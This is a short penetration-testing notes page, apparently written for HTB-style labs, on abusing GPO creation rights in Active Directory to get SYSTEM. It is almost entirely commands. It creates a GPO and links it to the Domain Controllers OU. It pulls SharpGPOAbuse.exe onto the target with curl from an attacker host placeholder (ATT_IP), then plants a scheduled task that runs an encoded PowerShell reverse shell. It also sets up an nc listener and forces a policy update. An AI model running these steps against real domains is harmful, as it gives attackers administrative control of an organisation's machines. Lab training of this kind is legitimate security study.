# GPO Abuse

## Create GPO rights

If we have obtained an account with rights for create a GPO, we can abuse it to escalate our privileges.

Create a new GPO (Do not overwrite any policy, it's then difficult to delete and it might create problems)

```powershell
New-GPO -name "GPO_NAME"
```

Link the GPO to the Domain

```powershell
New-GPLINK -name "GPO_NAME" -target "OU=DOMAIN CONTROLLERS,DC=DOMAIN,DC=HTB"
```

Now we have to transfer to target machine a SharpCollection executable that it will create the malicious GPO.&#x20;

{% code title="Attack machine - Kali" %}
```bash
cp /opt/SharpCollection/NetFramework_4.7/Any/SharpGPOAbuse.exe .
python3 -m http.server
```
{% endcode %}

{% code title="Target machine - Windows" %}
```powershell
cd \programdata
curl http://ATT_IP/SharpGPOAbuse.exe -o sharpgpoabuse.exe
```
{% endcode %}

Execute the executable with this arguments to get a reverse shell as a Administrator or Authority Sytem

{% code title="Run GPOAbuse - Win Target machine" overflow="wrap" %}
```powershell
.\sharpgpoabuse.exe --AddComputerTask --GPOName "GPO_NAME" --Author "AUTHOR" --TarkName "RevShell" --Command "powershell.exe" --Arguments 'powershell -enc HOAXSHELL_HASH' 
```
{% endcode %}

{% code title="Setup listener - Kali" %}
```
nc -lnvp PORT
```
{% endcode %}

Once ran the command, run this other command to apply the policy to this pc

{% code title="Target Machine" %}
```powershell
gpupdate /force
```
{% endcode %}

Reverse shell should establish:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

